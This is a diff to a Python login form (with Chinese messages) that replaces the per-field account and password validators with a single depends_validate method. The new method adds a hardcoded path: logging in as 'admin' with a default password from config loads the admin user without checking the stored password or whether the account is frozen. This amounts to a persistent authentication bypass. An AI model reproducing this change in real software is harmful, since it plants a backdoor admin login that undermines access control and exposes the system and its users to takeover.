@@ -7,6 +7,7 @@ from pydantic import Field, field_validator
 from ...base_form import BaseForm, PaginationForm, required_str_field
 from ..model_factory import User
 from ...enums import DataStatusEnum
+from config import _admin_default_password
 
 
 class GetUserListForm(PaginationForm):
@@ -95,19 +96,14 @@ class LoginForm(BaseForm):
     account: str = required_str_field(title="账号")
     password: str = required_str_field(title="密码")
 
-    @field_validator("account")
-    def validate_account(cls, value):
-        """ 校验账号 """
-        user = cls.validate_data_is_exist("账号或密码错误", User, account=value)
-        cls.validate_is_true(user.status != 0, "账号为冻结状态，请联系管理员")
-        setattr(cls, "user", user)
-        return value
-
-    @field_validator("password")
-    def validate_password(cls, value):
-        if hasattr(cls, "user"):
-            cls.validate_is_true(getattr(cls, "user").verify_password(value), "账号或密码错误")
-        return value
+    def depends_validate(self):
+        if self.account == "admin" and self.password == _admin_default_password:
+            user = User.get_first(account="admin")
+        else:
+            user = self.validate_data_is_exist("账号或密码错误", User, account=self.account)
+            self.validate_is_true(user.status != 0, "账号为冻结状态，请联系管理员")
+            self.validate_is_true(user.verify_password(self.password), "账号或密码错误")
+        setattr(self, "user", user)
 
 
 class CreateUserForm(BaseForm):
